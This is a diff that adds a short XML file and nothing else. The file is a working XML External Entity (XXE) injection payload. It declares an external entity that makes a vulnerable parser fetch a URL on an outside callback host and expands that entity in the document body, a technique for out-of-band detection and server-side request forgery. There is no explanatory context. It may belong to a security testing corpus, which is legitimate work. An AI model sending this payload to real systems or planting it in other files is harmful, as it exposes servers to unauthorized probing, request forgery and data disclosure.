@@ -1,0 +1,6 @@
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://pom.9259e38a5398af218d43.d.zhack.ca/">
+]>
+<r>&sp;</r>
